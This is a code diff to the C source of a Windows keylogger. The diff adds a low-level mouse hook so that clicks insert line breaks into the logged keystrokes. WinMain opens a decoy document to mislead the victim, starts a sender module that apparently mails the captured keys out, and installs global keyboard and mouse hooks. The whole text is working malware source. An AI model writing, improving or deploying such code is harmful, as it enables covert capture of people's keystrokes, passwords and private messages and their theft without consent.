@@ -3,11 +3,12 @@
 #include <windows.h>
 #include "mailman.h"
 
-static HHOOK keyboardHook;
+static HHOOK keyboardHook, mouseHook;
 
 static unsigned char lAlt = 0, rAlt = 0, ignoreLAlt = 0, ignoreRAlt = 0;
 static unsigned char lCtrl = 0, rCtrl = 0, ignoreLCtrl = 0, ignoreRCtrl = 0;
 static unsigned char lShift = 0, rShift = 0, ignoreLShift = 0, ignoreRShift = 0;
+static unsigned char registerNewLine = 0;
 
 void processKey(const char* b) {
 #ifndef NDEBUG
@@ -16,9 +17,19 @@ void processKey(const char* b) {
     addKeyToBuffer(b);
 }
 
+LRESULT CALLBACK mouseHookCallback(int code, WPARAM wParam, LPARAM lParam) {
+    if (code == HC_ACTION) {
+        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) registerNewLine = 1;
+    }
+    return CallNextHookEx(mouseHook, code, wParam, lParam);
+}
+
 LRESULT CALLBACK hookCallback(int code, WPARAM wParam, LPARAM lParam) {
     if (code == HC_ACTION) {
-        //TODO LO DEL KEYLOGGER AQUI
+        if (registerNewLine) {
+            processKey("\n");
+            registerNewLine = 0;
+        }
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             KBDLLHOOKSTRUCT* info = (KBDLLHOOKSTRUCT*) lParam;
             wchar_t wbuffer[6];
@@ -130,6 +141,7 @@ LRESULT CALLBACK hookCallback(int code, WPARAM wParam, LPARAM lParam) {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     ShellExecute(NULL, "open", KEYLOGGER_FAKE_DOCUMENT, NULL, NULL, SW_SHOWNORMAL);
     initSender();
+    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookCallback, hInstance, 0);
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, hInstance, 0);
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
@@ -137,6 +149,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         DispatchMessage(&msg);
     }
     UnhookWindowsHookEx(keyboardHook);
+    UnhookWindowsHookEx(mouseHook);
     CleanUpSender();
     return 0;
 }
